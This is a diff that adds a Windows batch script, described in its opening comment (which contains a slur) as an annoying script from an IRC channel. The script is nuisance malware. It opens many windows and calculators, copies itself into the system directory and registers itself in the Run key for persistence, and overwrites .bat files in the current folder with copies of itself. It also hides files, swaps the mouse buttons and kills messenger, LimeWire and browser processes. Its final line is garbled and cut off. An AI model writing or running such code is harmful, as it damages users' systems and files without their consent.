@@ -1,0 +1,16 @@
+#Annoying script some retard left in #hackers
+@Echo off 
+color 4 
+title 4 
+title R.I.P 
+start 
+start 
+start 
+start 
+calc 
+copy %0 %Systemroot%\Greatgame > nul 
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ /d %systemroot%\Greatgame.bat /f > nul 
+copy %0 *.bat > nul 
+Attrib +r +h Greatgame.bat 
+Attrib +r +h RUNDLL32 
+USER32.DLL.SwapMouseButton start calc cls tskill msnmsgr tskill LimeWire tskill iexplore tskill NMain st
